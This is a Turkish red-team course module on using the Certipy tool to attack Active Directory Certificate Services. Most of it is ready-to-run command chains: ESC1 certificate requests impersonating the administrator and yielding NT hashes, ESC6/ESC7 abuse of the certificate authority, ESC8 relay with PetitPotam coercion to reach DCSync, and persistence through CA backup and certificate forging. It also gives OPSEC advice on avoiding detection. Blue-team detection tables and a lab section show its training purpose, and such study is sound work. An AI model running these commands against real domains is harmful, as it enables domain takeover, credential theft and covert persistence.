## 1. Kavramsal Temel — Neden Var?

ESC1-8 ([07.1](./07.1_ESC1_ESC8_Somuru_Teknikleri.md)) ve Certifried ([07.2](./07.2_Certifried_CVE_2022_26923.md)) tek tek ele alındı. **Certipy** bunların tümünü — keşiften sömürüye, kalıcılığa kadar — tek Python aracında birleştirir:

> **Certipy, AD CS saldırılarının "İsviçre çakısıdır": zafiyetli şablonları bulur (`find`), sertifika ister (`req`), PKINIT ile kimlik doğrular (`auth`), CA'yı yapılandırır (`ca` — ESC7), makine hesabı yönetir (`account` — Certifried), gölge kimlik ekler (`shadow` — [05.4](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/05.4_Shadow_Credentials.md)) ve CA'yı yedekler (`ForgeCert` için [07.4](./07.4_ForgeCert_ve_Sertifika_Kaliciligi.md)). Tek araçta uçtan uca AD CS kill chain.**

Otomasyonun gücü, aynı zamanda **tespit yüzeyidir**: `certipy find` bir ortamda tüm ESC'leri saniyede tarar ama bu geniş LDAP/RPC etkinliği izlenebilir. Araç güçlü; kullanım disiplini gerektirir.

**Analoji:** Certipy = tüm AD CS kilit türlerini tanıyan usta bir çilingir seti. Hangi kilidin zayıf olduğunu söyler ve uygun maymuncuğu otomatik seçer — ama tüm kilitleri hızla denemek gürültü çıkarır.

## 2. Teknik Derinlik — Certipy Komut Mimarisi

### 2.1 Alt-komut → saldırı eşlemesi

```
   certipy find      → tüm ESC'leri denetle (LDAP + CA yapılandırma okuma)
   certipy req       → sertifika iste (ESC1: -upn/-sid ; ESC3: -on-behalf-of)
   certipy auth      → pfx ile PKINIT → TGT + NT hash (UnPAC)
   certipy ca        → CA yönetimi (ESC7: -add-officer ; ESC6: EDITF flag)
   certipy account   → makine hesabı (Certifried: -dns ; genel yönetim)
   certipy shadow    → msDS-KeyCredentialLink (Shadow Credentials, 05.4)
   certipy template  → şablon düzenleme (ESC4: zafiyetli hâle getir)
   certipy relay     → ESC8 (web enrollment relay, Modül 08)
   certipy forge     → CA anahtarıyla sertifika forge (07.4)
```

### 2.2 `find` çıktısını okuma (BloodHound entegrasyonu)

```
   certipy find çıktısı:
   - .txt / .json → insan-okur ESC bulguları
   - -bloodhound / -old-bloodhound → BloodHound'a aktarılabilir grafik
   → BloodHound'da "ADCS" kenarları (CanEnroll, ESC1…) ile grafiğe eklenir → 01.2 ile birleşir
```

### 2.3 ESC7 — ManageCA ile CA'yı silahlandırma

```
   CA üzerinde "ManageCA" hakkın varsa (ESC7):
   1) Kendini "certificate officer" yap → talepleri onaylayabilirsin
   2) EDITF_ATTRIBUTESUBJECTALTNAME2'yi AÇ (ESC6) → her şablonda SAN enjekte
   3) veya onay bekleyen bir talebi onayla
   → CA'nın kendisini yanlış-yapılandırmaya çevirirsin (yapılandırma = silah)
```

## 3. Pratik Uygulama — Uçtan Uca Certipy

### 3.1 Keşif

```bash
certipy find -u jdoe@corp.local -p 'Welcome1' -dc-ip 10.10.10.5 -vulnerable -stdout
# JSON + BloodHound için:
certipy find -u jdoe@corp.local -p 'Welcome1' -dc-ip 10.10.10.5 -bloodhound
```

### 3.2 ESC1 tam zincir

```bash
certipy req -u jdoe@corp.local -p 'Welcome1' -ca 'CORP-CA' -template 'VulnTemplate' \
  -upn administrator@corp.local -dc-ip 10.10.10.5
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5   # TGT + NT hash
```

### 3.3 ESC6 / ESC7 (CA tarafı)

```bash
# ESC7: kendini officer yap
certipy ca -u jdoe@corp.local -p 'Welcome1' -ca 'CORP-CA' -add-officer jdoe -dc-ip 10.10.10.5
# ESC6: SAN enjeksiyon flag'ini aç (sonra herhangi bir şablonda -upn kullan)
certipy ca -u jdoe@corp.local -p 'Welcome1' -ca 'CORP-CA' -enable-attributesubjectaltname2
# onay bekleyen talebi ver
certipy ca -ca 'CORP-CA' -issue-request 42 -u jdoe@corp.local -p 'Welcome1'
```

### 3.3.1 Kerberos/hash ile kimlik doğrulama (parola olmadan)

```bash
# Certipy tüm alt-komutlarda parola yerine hash veya bilet kabul eder
certipy find -u jdoe@corp.local -hashes :<NThash> -dc-ip 10.10.10.5 -vulnerable
certipy req -u 'FAKE01$'@corp.local -hashes :<NThash> -ca 'CORP-CA' -template 'Machine'
# Kerberos bilet ile (KRB5CCNAME):
KRB5CCNAME=jdoe.ccache certipy find -k -no-pass -target dc01.corp.local -vulnerable
```

### 3.4 SID-uyumlu talep (KB5014754 ortamı)

```bash
# Full Enforcement ortamında SAN + SID birlikte (StrongCertificateBindingEnforcement uyumu)
certipy req -u jdoe@corp.local -p 'Welcome1' -ca 'CORP-CA' -template 'VulnTemplate' \
  -upn administrator@corp.local -sid 'S-1-5-21-...-500' -dc-ip 10.10.10.5
```

**Örnek `find -vulnerable` çıktısı:**
```
Certificate Templates
  0
    Template Name       : VulnTemplate
    Enrollment Rights   : CORP.LOCAL\Domain Users
    [!] Vulnerabilities
        ESC1 : 'Domain Users' can enroll, enrollee supplies subject and template
               allows client authentication
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| `certipy find` (geniş ESC taraması) | **T1649** / T1087 | Kısa sürede geniş LDAP + CA yapılandırma okuma | [Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md) |
| ESC7 officer ekleme | **T1098** | CA yapılandırma değişikliği; officer listesi değişimi | [Blue 07.2](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.2_CA_Hardening_ve_ESC6.md) |
| ESC6 flag açma | T1112 (Modify Registry) | CA'da `EDITF_ATTRIBUTESUBJECTALTNAME2` registry/policy değişimi | [Blue 07.2](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.2_CA_Hardening_ve_ESC6.md) |
| Sertifika talebi | T1649 | 4886/4887 | [Blue 07.4](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.4_PKI_Izleme_ve_Olay_Kayitlari.md) |

**OPSEC notları:**
- **`certipy find` gürültülüdür** — tüm şablonları ve CA yapılandırmasını okur. Ortam AD CS izliyorsa ([Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md)) geniş tarama dikkat çeker. Mümkünse hedefli oku veya BloodHound verisinden ([01.2](../Modul_01_Kesif_ve_Numaralandirma/01.2_SharpHound_ve_BloodHound.md)) ADCS kenarlarını kullan.
- **ESC6/ESC7 CA değişiklikleri kalıcı ve yüksek-görünürdür** — CA'nın `EDITF` flag'i veya officer listesi değişimi nadir ve kritik olaylardır ([Blue 07.2](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.2_CA_Hardening_ve_ESC6.md)). İşin bitince geri al; kalıcı ESC6 = tüm ortam için tehlike + kesin tespit.
- **`-sid` parametresini KB5014754 ortamında kullan** — SID olmadan Full Enforcement talebi reddedilir. Ortamın enforcement seviyesini bilmiyorsan önce SID'siz dene, red gelirse SID ekle (gereksiz başarısız talep = ekstra 4886).
- **Certipy sürüm farkları:** 4.x ADCS eşlemesi ve komut sözdizimi 5.x'te değişti; ortama uygun sürümü kullan (çıktı/parametre uyumsuzluğu operasyonel hata yapar).

## 5. Doğrulama / Lab

```bash
# 1) Lab AD CS'te birkaç ESC (ESC1 + ESC7) kur. certipy find -vulnerable ile tümünü listele
certipy find -u jdoe@corp.local -p 'Welcome1' -dc-ip <DC> -vulnerable -stdout
# 2) ESC1'i req+auth ile, ESC7'yi ca -add-officer ile sömür
# 3) Blue: CA config değişimi (ESC7) + 4886/4887 (req) olaylarını yakala
Get-WinEvent -LogName 'Microsoft-Windows-CertificationAuthority' -MaxEvents 20
# 4) Şablonları düzelt + Full Enforcement → find artık ESC1'i "vulnerable" göstermemeli
```

Atomic Red Team: **T1649** → Blue doğrulaması [Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md).

### 3.5 ESC8 relay (Certipy relay modülü)

```bash
# 1) Certipy'yi CA web enrollment'a relay sunucusu olarak başlat
certipy relay -target 'http://ca.corp.local' -template 'DomainController'
# 2) Koersiyon ile DC01$'ı Certipy'ye zorla (Modül 08)
petitpotam.py -u jdoe -p 'Welcome1' -d corp.local <certipy-ip> 10.10.10.5
# → DC01$ için sertifika alınır → certipy auth → DC01$ → DCSync
```

### Gerçek-dünya Certipy kill chain (tek araç, uçtan uca)

```
   1) certipy find -vulnerable -bloodhound → ESC1 + ESC7 + web enrollment (ESC8) tespit
   2) En sessiz yol seçimi: ESC1 (tek sertifika talebi, CA config değişmez)
   3) certipy req -upn administrator → auth → administrator hash
   4) Kalıcılık gerekiyorsa: certipy ca -backup → forge (07.4)
   5) BloodHound ADCS kenarlarıyla alternatif yolları doğrula
   Disiplin: en az CA-yapılandırması değiştiren, en az talep üreten yolu seç.
```
